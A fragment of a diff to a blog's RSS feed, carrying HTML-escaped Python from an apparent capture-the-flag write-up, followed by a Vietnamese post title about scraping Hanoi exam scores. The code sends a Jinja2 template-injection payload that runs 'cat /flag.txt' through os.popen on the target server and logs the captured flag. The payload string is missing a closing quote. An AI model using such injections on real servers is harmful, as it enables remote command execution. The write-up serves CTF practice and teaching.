+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gzip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Secret&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SecR3Ttoken&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{url_for.__globals__.os.__dict__.popen(&amp;#39;cat /flag.txt).read()}}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;hostname&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Spider-msi&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>Câu chuyện cào điểm thi Hà Nội đầy gian nan</title>
         <link>/p/c%C3%A2u-chuy%E1%BB%87n-c%C3%A0o-%C4%91i%E1%BB%83m-thi-h%C3%A0-n%E1%BB%99i-%C4%91%E1%BA%A7y-gian-nan/</link>
         <pubDate>Sat, 01 Jul 2023 00:00:00 +0000</pubDate>
